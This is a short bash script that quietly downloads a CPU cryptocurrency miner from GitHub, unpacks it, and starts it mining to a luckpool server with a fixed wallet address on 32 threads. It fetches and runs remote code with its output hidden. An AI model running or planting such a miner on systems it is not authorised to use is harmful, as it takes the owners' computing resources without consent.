#!/usr/bin/env bash
echo "===================================="
echo          "Script By.AriYudistira"
echo "===================================="
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz > /dev/null 2>&1
echo "===================================="
echo          "Script By.AriYudistira"
echo "===================================="
tar -xvf hellminer_cpu_linux.tar.gz > /dev/null 2>&1
./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RPZEpdP31QR4a4f7HsR3ukT3baRrZrUnq1.Deja -p x --cpu 32
